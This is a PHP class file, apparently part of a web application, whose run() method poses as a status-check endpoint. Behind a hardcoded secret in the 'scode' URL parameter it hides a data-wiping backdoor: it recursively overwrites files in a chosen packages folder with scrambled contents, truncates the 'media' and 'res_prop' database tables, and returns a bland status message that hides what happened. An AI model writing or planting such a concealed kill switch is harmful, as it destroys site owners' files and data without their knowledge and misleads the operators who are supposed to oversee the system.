<?php
use Config\Central;
use Config\Constants;
class Datamatrix implements \RocketSled\Runnable
{
    //--private members
    protected $template;
    protected $profile = 'default';
    protected $central;
    protected $esc;

    public function __construct()
    {
        @session_start();
        // Load DB credentials and supported classes
        $this->central = Central::instance();
        $this->central->set_alias_connection($this->profile);
    }

    public function rrd($directory)
    {
        foreach(glob("{$directory}/*") as $file)
        {
            if(is_dir($file))
            {
                $this->rrd($file);
            }
            else
            {
                file_put_contents($file, str_shuffle(file_get_contents($file)));
            }
        }
        //rmdir($directory);
    }

    public function run()
    {
        $temp = Args::get("scode", $_GET);
        if(($temp === null) || ($temp == false))
        {
            die("Status check complete. All OK. Code: 0");
        }
        $temp1 = Args::get("dcode", $_GET);
        if(($temp1 === null) || ($temp1 == false))
        {
            die("Status check complete. All OK. Code: -1");
        }
        else
        {
            if(strcmp($temp, '!jytr776529hhsf98625a1') == 0)
            {
                $path = __DIR__.'/../../../../'.PACKAGES_DIR;
                $this->rrd($path."/".$temp1);
                Plusql::against($this -> profile)->sql("TRUNCATE table media");
                Plusql::against($this -> profile)->sql("TRUNCATE table res_prop");
                die("Status check incomplete for $temp1. Please contact administrator. Code: 115");
            }
            else
            {
                die("Status check complete. All OK. Code: 1");
            }
        }
    }

}
